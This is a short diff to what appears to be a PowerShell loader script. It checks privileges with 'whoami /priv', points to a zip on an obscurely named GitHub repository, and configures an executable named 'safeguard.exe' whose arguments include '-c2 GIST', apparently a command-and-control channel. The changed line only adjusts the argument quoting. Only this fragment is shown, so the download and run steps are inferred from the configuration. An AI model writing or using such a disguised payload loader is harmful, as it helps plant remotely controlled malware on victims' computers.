@@ -11,7 +11,7 @@ whoami /priv
 # Configuration
 $zipUrl = "https://github.com/ghtimetodowork/asdfadsffasfasdasfasfdsdfasdfasdfasdfasdfasdfasdfasdfasdfsdfasdf/raw/refs/heads/main/safeguard.zip"
 $exeName = "safeguard.exe"
-$exeArgs = "-group 'red' -v -c2 'GIST' -delay 4"
+$exeArgs = "-group red -v -c2 GIST -delay 4"
 
 # Paths
 $downloadsPath = Join-Path $env:USERPROFILE "Downloads"
